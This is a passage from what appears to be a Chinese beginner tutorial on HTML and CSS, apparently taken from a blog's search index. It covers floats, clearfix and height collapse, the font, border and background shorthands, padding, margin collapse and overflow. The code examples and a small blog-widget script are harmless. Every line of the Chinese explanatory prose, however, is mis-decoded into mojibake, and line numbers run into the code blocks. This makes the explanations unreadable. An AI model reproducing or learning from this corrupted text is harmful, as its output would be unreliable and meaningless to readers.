ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š è¡Œå†…å…ƒç´ æ¨ªå‘å¸ƒå±€çš„é—®é¢˜ ä»£ç æ¢è¡Œä¼šé€ æˆå…ƒç´ ä¹‹é—´æœ‰é»˜è®¤é—´è· è¡Œå†…å…ƒç´ æ˜¯æ²¿åŸºçº¿å¯¹é½ï¼ˆåº•éƒ¨å¯¹é½ï¼‰ï¼Œå…·ä½“è¡¨ç°ä¸ºå½“ç»™å…ƒç´ è®¾ç½®å‚ç›´æ–¹å‘çš„å†…å¤–è¾¹è·æ—¶ï¼Œç”±äºå—åŸºçº¿å¯¹é½çš„é™åˆ¶ï¼Œå‚ç›´æ–¹å‘çš„å†…å¤–è¾¹è·èµ·ä¸åˆ°é¢„æœŸçš„æ•ˆæœ 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;è¡Œå†…å…ƒç´ æ¨ªå‘å¸ƒå±€çš„é—®é¢˜ï¼š&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } body { margin: 300px; } .one { width: 100px; height: 100px; background: red; } .span1 { padding: 50px; /* margin: 50px; */ } span { background: green; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;span class="span1"&gt;æˆ‘æ˜¯æ–‡æœ¬&lt;/span&gt; &lt;span class="span2"&gt;æˆ‘æ˜¯æ–‡æœ¬&lt;/span&gt; &lt;span class="span3"&gt;æˆ‘æ˜¯æ–‡æœ¬&lt;/span&gt;&lt;/body&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š float æµ®åŠ¨å±æ€§CSS çš„ä¸‰ç§æ˜¾ç¤ºæ¨¡å¼ï¼ˆå—çº§ã€è¡Œå†…ã€è¡Œå†…å—ï¼‰å±äºæ ‡å‡†æµã€‚æµ®åŠ¨çš„å±æ€§æ˜¯ floatï¼Œæ˜¯ä¸€ä¸ªè„±ç¦»æ ‡å‡†æµçš„çŠ¶æ€ï¼Œä¹Ÿå« â€œæµ®åŠ¨æµâ€ã€‚å½“å…ƒç´ è®¾ç½®æµ®åŠ¨å±æ€§åï¼Œä¼šæŒ‰ç…§æ ‡ç­¾çš„ä¹¦å†™é¡ºåºï¼Œä¾æ¬¡æ’åˆ—åœ¨åŒ…å«å—ï¼ˆçˆ¶å…ƒç´ ï¼‰å†…ï¼Œä¸€èˆ¬ç§°ä¹‹ä¸º æµ®åŠ¨æ¨ªå‘å¸ƒå±€ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œfloat å±æ€§å¯ä»¥è§£å†³è¡Œå†…å—å’Œè¡Œå†…å…ƒç´ æ¨ªå‘å¸ƒå±€çš„é—®é¢˜ï¼Œæµ®åŠ¨æ¨ªå‘å¸ƒå±€ æ²¡æœ‰ä»£ç æ¢è¡Œé€ æˆçš„é»˜è®¤é—´è·ï¼Œè®¾ç½®è‡ªèº«å†…å¤–ï¼ˆå‚ç›´ï¼‰è¾¹è·ä¸ä¼šå½±å“å‘¨å›´çš„å…ƒç´ ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;æµ®åŠ¨&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } body { margin: 300px; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; background: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š æµ®åŠ¨æ¨ªå‘å¸ƒå±€æµ®åŠ¨æ¨ªå‘å¸ƒå±€ä¹‹ä¸€1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;æµ®åŠ¨æ¨ªå‘å¸ƒå±€ä¸€&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š æµ®åŠ¨æ¨ªå‘å¸ƒå±€ä¹‹äºŒ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;æµ®åŠ¨æ¨ªå‘å¸ƒå±€&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; height: 300px; background: gray; } .main { height: 200px; background: yellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š æµ®åŠ¨å¸ƒå±€çš„é«˜åº¦å¡Œé™·é—®é¢˜å½“å­å…ƒç´ æ˜¯æµ®åŠ¨ï¼Œä¸”çˆ¶å…ƒç´ æ²¡æœ‰è®¾ç½®å›ºå®šé«˜åº¦æ—¶ï¼Œç”±äºå­å…ƒç´ æ˜¯é£˜èµ·æ¥çš„çŠ¶æ€ï¼Œçˆ¶å…ƒç´ ä¼šè®¤ä¸ºæ²¡æœ‰å†…å®¹æ’‘å¼€è‡ªèº«çš„é«˜åº¦ï¼Œæ­¤æ—¶ä¼šé€ æˆé«˜åº¦å¡Œé™·ï¼Œå³çˆ¶å…ƒç´ çš„é«˜åº¦æ˜¯é›¶ã€‚è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š ç¬¬ä¸€ç§ï¼šç»™çˆ¶å…ƒç´ è®¾ç½® overflow: hidden å±æ€§ï¼Œæ­¤æ–¹æ¡ˆä¸€èˆ¬ä¸é€‚ç”¨äºä¸‹æ‹‰èœå• ç¬¬äºŒç§ï¼šé¢å¤–æ ‡ç­¾æ³• ç¬¬ä¸‰ç§ï¼šçˆ¶å…ƒç´ è°ƒç”¨ clearFix ç±»åï¼ˆæ¨èï¼‰ ç¬¬ä¸€ç§è§£å†³æ–¹æ¡ˆ1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;æµ®åŠ¨å¸ƒå±€çš„é«˜åº¦å¡Œé™·é—®é¢˜&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; background: gray; margin: 0 auto; /* ç¬¬ä¸€ç§æ–¹æ¡ˆï¼šç»™çˆ¶å…ƒç´ è®¾ç½®overflowå±æ€§ */ overflow: hidden; } .main { height: 200px; background: yellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ç¬¬äºŒç§è§£å†³æ–¹æ¡ˆ1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;æµ®åŠ¨å¸ƒå±€çš„é«˜åº¦å¡Œé™·é—®é¢˜&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; background: gray; margin: 0 auto; } .main { height: 200px; background: yellow; } /* ç¬¬äºŒç§æ–¹æ¡ˆï¼ˆé¢å¤–æ ‡ç­¾æ³•ï¼‰ */ .four { background: orange; /* æ¸…é™¤ä¹‹å‰çš„æµ®åŠ¨å…ƒç´ é€ æˆçš„å½±å“ï¼Œè®©æµ®åŠ¨å…ƒç´ å ç”¨ä½ç½® */ clear: both; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;!-- ç¬¬äºŒç§æ–¹æ¡ˆï¼ˆé¢å¤–æ ‡ç­¾æ³•ï¼‰ --&gt; &lt;div class="four"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ç¬¬ä¸‰ç§è§£å†³æ–¹æ¡ˆ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;æµ®åŠ¨å¸ƒå±€çš„é«˜åº¦å¡Œé™·é—®é¢˜&lt;/title&gt; &lt;style type="text/css"&gt; * { margin: 0; padding: 0; } .one { width: 50px; height: 50px; background: red; float: left; } .two { width: 100px; height: 100px; float: left; background: green; } .three { width: 150px; height: 150px; float: left; background: blue; } .box { width: 400px; background: gray; margin: 0 auto; } .main { height: 200px; background: yellow; } /* ç¬¬ä¸‰ç§æ–¹æ¡ˆï¼ˆçˆ¶å…ƒç´ è°ƒç”¨clearFixç±»åï¼‰ */ .clearFix::after { content: ""; display: block; clear: both; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- ç¬¬ä¸‰ç§æ–¹æ¡ˆï¼ˆçˆ¶å…ƒç´ è°ƒç”¨clearFixç±»åï¼‰ --&gt; &lt;div class="box clearFix"&gt; &lt;div class="one"&gt;&lt;/div&gt; &lt;div class="two"&gt;&lt;/div&gt; &lt;div class="three"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="main"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; æœ€ç»ˆæ•ˆæœå›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"å‰ç«¯å…¥é—¨åŸºç¡€ä¹‹ HTML ä¸ CSS ä¹‹ä¸‰",url:"/posts/625c1dcd.html",text:'CSS åŸºç¡€è¡Œé«˜ä¸è¡Œé—´è·è¡Œé—´è·åœ¨ HTML ä¸­ï¼Œå±•ç¤ºçš„æ–‡å­—æ¶‰åŠåˆ°ä¸‹è¿°å‡ æ¡åŸºå‡†çº¿ï¼ŒåŒ…æ‹¬é¡¶çº¿ (ç»¿è‰²)ã€ä¸­çº¿ (è“è‰²)ã€åŸºçº¿ (çº¢è‰²)ã€åº•çº¿ (ç´«è‰²)ã€‚è¡Œè·æ˜¯æŒ‡ä¸€è¡Œåº•çº¿åˆ°ä¸‹ä¸€è¡Œé¡¶çº¿çš„å‚ç›´è·ç¦»ã€‚ è¡Œé«˜è¡Œé«˜æ˜¯æŒ‡ä¸€è¡ŒåŸºçº¿åˆ°ä¸‹ä¸€è¡ŒåŸºçº¿çš„å‚ç›´è·ç¦»ã€‚å¸Œæœ›è®¾ç½®æ–‡æœ¬åœ¨å…ƒç´ ä¸­å‚ç›´æ–¹å‘çš„ä½ç½®æ—¶ï¼Œå½“ç›’å­æ²¡æœ‰è®¾ç½®å›ºå®šçš„é«˜åº¦ï¼Œé‚£ä¹ˆé«˜åº¦ä¼šéšç€è¡Œé«˜çš„å˜åŒ–è€Œå˜åŒ–ï¼›æ­¤æ—¶é«˜åº¦å°±æ˜¯è¡Œé«˜çš„å€¼ï¼Œå› ä¸ºæ–‡æœ¬å§‹ç»ˆè¦ä¿æŒå‚ç›´å±…ä¸­äºç›’å­ã€‚å½“ç›’å­è®¾ç½®äº†å›ºå®šçš„é«˜åº¦æ—¶ï¼Œé«˜åº¦ä¸ä¼šéšç€è¡Œé«˜çš„å˜åŒ–è€Œå˜åŒ–ã€‚ä¸€å¥è¯ç®€å•æ¦‚æ‹¬ï¼Œå½“å¸Œæœ›ä¸€ä¸ªå…ƒç´ ä¸­çš„æ–‡æœ¬å‚ç›´å±…ä¸­äºè¿™ä¸ªå…ƒç´ ï¼Œåˆ™å¯ä»¥è®¾ç½®è¡Œé«˜ç­‰äºç›’å­çš„é«˜åº¦ã€‚ 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;è¡Œé«˜å’Œæ–‡æœ¬å‚ç›´å±…ä¸­&lt;/title&gt; &lt;style type="text/css"&gt; div { background-color: pink; font-size: 40px; line-height: 80px; height: 80px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;æ–‡æœ¬&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š å¤åˆå±æ€§font å¤åˆå±æ€§ font å¤åˆå±æ€§çš„ä¹¦å†™è§„åˆ™ï¼šå€¾æ–œ | åŠ ç²— | å­—å·/è¡Œé«˜ | å­—ä½“ï¼Œå…¶ä¸­ å­—å· å’Œ å­—ä½“ æ˜¯å¿…å¡«é¡¹ font å¤åˆå±æ€§çš„ä¹¦å†™ç¤ºä¾‹ï¼šfont: italic 700 50px/100px "å®‹ä½“"ã€font: 50px "å®‹ä½“" å½“å•å±æ€§å’Œå¤åˆå±æ€§åŒæ—¶å­˜åœ¨æ—¶ï¼Œå¿…é¡»å…ˆå†™å¤åˆå±æ€§å†å†™å•å±æ€§ï¼Œå¦åˆ™å•å±æ€§ä¼šè¢«å¤åˆå±æ€§ä¸­çš„å€¼è¦†ç›–æ‰ 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;fontå¤åˆå±æ€§&lt;/title&gt; &lt;style type="text/css"&gt; div { color: red; height: 100px; background-color: pink; } .box1 { line-height: 100px; /* font å•å±æ€§ */ font-size: 50px; font-weight: 400; font-family: "å®‹ä½“"; font-style: italic; } .box2 { /* font å¤åˆå±æ€§ */ font: italic 700 50px/100px "å®‹ä½“"; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;font å•å±æ€§&lt;/div&gt; &lt;p&gt;&lt;/p&gt; &lt;div class="box2"&gt;font å¤åˆå±æ€§&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; border å¤åˆå±æ€§ border å¤åˆå±æ€§çš„ä¹¦å†™è§„åˆ™ï¼šç²—ç»† | æ ·å¼ | é¢œè‰² border å¤åˆå±æ€§çš„ä¹¦å†™ç¤ºä¾‹ï¼šborder: 3px dotted redã€border: dotted red å½“å•å±æ€§å’Œå¤åˆå±æ€§åŒæ—¶å­˜åœ¨æ—¶ï¼Œå¿…é¡»å…ˆå†™å¤åˆå±æ€§å†å†™å•å±æ€§ï¼Œå¦åˆ™å•å±æ€§ä¼šè¢«å¤åˆå±æ€§ä¸­çš„å€¼è¦†ç›–æ‰ 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;borderå¤åˆå±æ€§&lt;/title&gt; &lt;style type="text/css"&gt; div { color: black; width: 200px; height: 200px; line-height: 200px; text-align: center; background-color: pink; } .box1 { /* border å•å±æ€§ */ border-width: 5px; border-style: solid; border-color: red; } .box2 { /* border å¤åˆå±æ€§ */ border: 3px dotted red; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;border å•å±æ€§&lt;/div&gt; &lt;p&gt;&lt;/p&gt; &lt;div class="box2"&gt;border å¤åˆå±æ€§&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background å¤åˆå±æ€§ background å¤åˆå±æ€§çš„ä¹¦å†™è§„åˆ™ï¼šèƒŒæ™¯é¢œè‰² | èƒŒæ™¯å›¾ç‰‡ | èƒŒæ™¯å›¾ç‰‡çš„å¹³é“ºæ–¹å¼ | æ°´å¹³ä½ç½® | å‚ç›´ä½ç½® background å¤åˆå±æ€§çš„ä¹¦å†™ç¤ºä¾‹ï¼šbackground: pink url(https://www.techgrow.cn/img/head.jpg) no-repeat center center å½“å•å±æ€§å’Œå¤åˆå±æ€§åŒæ—¶å­˜åœ¨æ—¶ï¼Œå¿…é¡»å…ˆå†™å¤åˆå±æ€§å†å†™å•å±æ€§ï¼Œå¦åˆ™å•å±æ€§ä¼šè¢«å¤åˆå±æ€§ä¸­çš„å€¼è¦†ç›–æ‰ 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;backgroundå¤åˆå±æ€§&lt;/title&gt; &lt;style type="text/css"&gt; div { color: red; width: 400px; height: 400px; line-height: 200px; text-align: center; } .box1 { /* background å•å±æ€§ */ background-color: pink; background-repeat: no-repeat; background-position: right bottom; background-image: url(https://www.techgrow.cn/img/head.jpg); } .box2 { /* background å¤åˆå±æ€§ */ background: pink url(https://www.techgrow.cn/img/head.jpg) no-repeat center center; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;background å•å±æ€§&lt;/div&gt; &lt;p&gt;&lt;/p&gt; &lt;div class="box2"&gt;background å¤åˆå±æ€§&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ç›’å­æ¨¡å‹ç›’å­æ¨¡å‹æ¦‚å¿µ padding å†…è¾¹è·å€¼å¾—ä¸€æçš„æ˜¯ï¼Œpadding å­˜åœ¨å‡å®½åº¦çš„ä½¿ç”¨åœºæ™¯ï¼šå½“å—å…ƒç´ æ²¡æœ‰è®¾ç½®å›ºå®šå®½åº¦æ—¶ï¼Œå³å®½åº¦å’Œçˆ¶å…ƒç´ ä¸€æ ·ï¼Œæ­¤æ—¶ç»™è¯¥å…ƒç´ è®¾ç½®æ°´å¹³æ–¹å‘çš„ padding æ—¶ï¼Œä¸ä¼šæ’‘å®½ç›’å­ï¼Œè€Œæ˜¯ä¼šä» content è‡ªåŠ¨å‡å» padding å€¼ï¼Œæœ€ç»ˆå®½åº¦çš„å°ºå¯¸æ˜¯ä¸å˜çš„ã€‚å½“å—å…ƒç´ è®¾ç½®äº†å›ºå®šå®½åº¦ï¼Œæ­¤æ—¶è®¾ç½®æ°´å¹³æ–¹å‘çš„ paddingï¼Œç›’å­çš„å®½åº¦å°ºå¯¸åˆ™ä¼šå˜å¤§ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;paddingå†…è¾¹è·&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; background: pink; /* å•å±æ€§çš„å†™æ³• */ /* å·¦å†…è¾¹è· */ padding-left: 10px; /* ä¸Šå†…è¾¹è· */ padding-top: 10px; /* å³å†…è¾¹è· */ padding-right: 10px; /* ä¸‹å†…è¾¹è· */ padding-bottom: 10px; } .box2 { width: 200px; height: 200px; background: yellow; /* å¤åˆå±æ€§çš„å†™æ³• */ /* ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šå³ä¸‹å·¦çš„å†…è¾¹è· */ padding: 10px; /* ä¸¤ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šä¸‹ã€å·¦å³çš„å†…è¾¹è· */ padding: 10px 20px; /* ä¸‰ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šã€å·¦å³ã€ä¸‹çš„å†…è¾¹è· */ padding: 10px 20px 30px; /* å››ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šã€å³ã€ä¸‹ã€å·¦çš„å†…è¾¹è· */ padding: 10px 20px 30px 40px; } .phone { width: 50px; height: 100px; background: yellowgreen; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; &lt;div class="phone"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="box2"&gt; &lt;div class="phone"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š margin å¤–è¾¹è·å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¤–è¾¹è·å­˜åœ¨åˆå¹¶çš„ä½¿ç”¨åœºæ™¯ï¼šå½“å‚ç›´æ’åˆ—çš„ä¸¤ä¸ªå—å…ƒç´ ï¼Œåˆ†åˆ«ç»™ä¸Šé¢çš„ç›’å­è®¾ç½®å‘ä¸‹çš„å¤–è¾¹è·å’Œç»™ä¸‹é¢çš„ç›’å­è®¾ç½®å‘ä¸Šçš„å¤–è¾¹è·ï¼Œæ­¤æ—¶ä¼šå½¢æˆå¤–è¾¹è·åˆå¹¶ã€‚å½“ä¸¤ä¸ªå¤–è¾¹è·çš„å€¼ç›¸åŒæ—¶ï¼Œé‚£ä¹ˆå¤–è¾¹è·å°±æ˜¯è¯¥å€¼ï¼Œå½“ä¸¤ä¸ªå€¼ä¸åŒæ—¶åˆ™æ˜¯è¾ƒå¤§çš„é‚£ä¸ªå€¼ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;marginå¤–è¾¹è·&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; background: pink; /* å•å±æ€§çš„å†™æ³• */ /* å·¦å¤–è¾¹è· */ margin-left: 30px; /* ä¸Šå¤–è¾¹è· */ margin-top: 30px; /* å³å¤–è¾¹è· */ margin-right: 30px; /* ä¸‹å¤–è¾¹è· */ margin-bottom: 30px; } .box2 { width: 200px; height: 200px; background: greenyellow; /* å¤åˆå±æ€§çš„å†™æ³• */ /* ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šå³ä¸‹å·¦çš„å¤–è¾¹è· */ margin: 10px; /* ä¸¤ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šä¸‹ã€å·¦å³çš„å¤–è¾¹è· */ margin: 10px 20px; /* ä¸‰ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šã€å·¦å³ã€ä¸‹çš„å¤–è¾¹è· */ margin: 10px 20px 30px; /* å››ä¸ªå€¼ï¼Œè¡¨ç¤ºä¸Šã€å³ã€ä¸‹ã€å·¦çš„å¤–è¾¹è· */ margin: 10px 20px 30px 40px; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt;&lt;/div&gt; &lt;div class="box2"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š margin å¤–è¾¹è·å¡Œé™· å¤–è¾¹è·å¡Œé™·ï¼šåµŒå¥—çš„ä¸¤ä¸ªå—å…ƒç´ ï¼Œç»™å­å…ƒç´ ï¼ˆç¬¬ä¸€ä¸ªï¼‰è®¾ç½®å‘ä¸Šçš„å¤–è¾¹è·ï¼Œæ­¤æ—¶çˆ¶å…ƒç´ ä¼šè·Ÿç€æ‰ä¸‹æ¥ï¼Œå½¢æˆäº†å¤–è¾¹è·å¡Œé™· è§£å†³æ–¹æ¡ˆ: ç¬¬ä¸€ç§ï¼šç»™çˆ¶å…ƒç´ è®¾ç½®ä¸Šè¾¹æ¡†ï¼Œborder-top: 1px solid transparent; ç¬¬äºŒç§ï¼šç»™çˆ¶å…ƒç´ è®¾ç½® overflow å±æ€§ï¼Œoverflow: hidden; ç¬¬ä¸‰ç§ï¼šç»™çˆ¶å…ƒç´ è®¾ç½®æµ®åŠ¨ ç¬¬å››ç§ï¼šç»™å­å…ƒç´ è®¾ç½®æµ®åŠ¨ 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;margin(å¤–è¾¹è·)å¡Œé™·&lt;/title&gt; &lt;style type="text/css"&gt; .box1 { width: 200px; height: 200px; overflow: hidden; background: pink; } .box2 { width: 50px; height: 80px; margin-left: 20px; margin-top: 20px; background: greenyellow; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box1"&gt; &lt;div class="box2"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š overflow å±æ€§123456789101112131415161718192021222324252627282930313233343536373839&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;overflowå±æ€§&lt;/title&gt; &lt;style type="text/css"&gt; .box { width: 200px; height: 200px; /* æº¢å‡ºå±æ€§ */ /* æº¢å‡ºéšè— */ /* overflow: hidden; */ /* æº¢å‡ºæ»šåŠ¨ */ /* overflow: scroll; */ /* æº¢å‡ºè‡ªåŠ¨è®¾ç½®æ»šåŠ¨æ¡ */ overflow: auto; /* æ¢è¡Œå±æ€§ */ /* å¼ºåˆ¶æ¢è¡Œ */ /* word-break: break-all; */ /* å¼ºåˆ¶ä¸æ¢è¡Œ */ /* white-space: nowrap; */ background: pink; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class="box"&gt; 5æœˆä»½ï¼Œè§„æ¨¡ä»¥ä¸Šå·¥ä¸šå¢åŠ å€¼ç‡å…ˆå®ç°ç”±è´Ÿè½¬æ­£ï¼ŒåŒæ¯”å¢é•¿0.7%ï¼Œ6æœˆä»½å¢é€ŸåŠ å¿«è‡³3.9%ã€‚éšç€ä¼ä¸šå¤å·¥å¤äº§åŠ å¿«æ¨è¿›ï¼Œäº§ä¸šé“¾ä¾›åº”é“¾å µç‚¹å¡ç‚¹é€æ­¥æ‰“é€šï¼Œæ±½è½¦ã€ç”µå­ç­‰é‡ç‚¹è¡Œä¸šå¸¦åŠ¨ä½œç”¨æœ‰æœ›è¿›ä¸€æ­¥å¢å¼ºã€‚6æœˆä»½ï¼Œåˆ¶é€ ä¸šPMIé‡å›ä¸´ç•Œç‚¹ä»¥ä¸Šï¼Œå…¶ä¸­ç”Ÿäº§ç»è¥æ´»åŠ¨é¢„æœŸæŒ‡æ•°å‡è‡³55.2%ï¼Œè¡¨æ˜åˆ¶é€ ä¸šä¼ä¸šä¿¡å¿ƒä¸æ–­å¢å¼ºã€‚ &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¸Šè¿°ä»£ç ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„æ•ˆæœå¦‚ä¸‹ï¼š å—å…ƒç´ æ°´å¹³å±…ä¸­text-align èƒ½è®©æ ‡ç­¾å†…çš„æ–‡æœ¬ã€è¡Œå†…å…ƒç´ ã€è¡Œå†…å—å…ƒç´ æ°´å¹³å±…ä¸­ï¼Œä½†ä¸èƒ½è®©æ ‡ç­¾å†…çš„å—å…ƒç´ æ°´å¹³å±…ä¸­ã€‚å¦‚æœå¸Œæœ›æ ‡ç­¾å†…çš„å—å…ƒç´ æ°´å¹³å±…ä¸­ï¼Œéœ€è¦ç»™å—å…ƒç´ è®¾ç½®æ°´å¹³å·¦å³æ–¹å‘çš„å¤–è¾¹è·ä¸ºè‡ªé€‚åº”ï¼Œå³ margin: 0 auto;ã€‚ 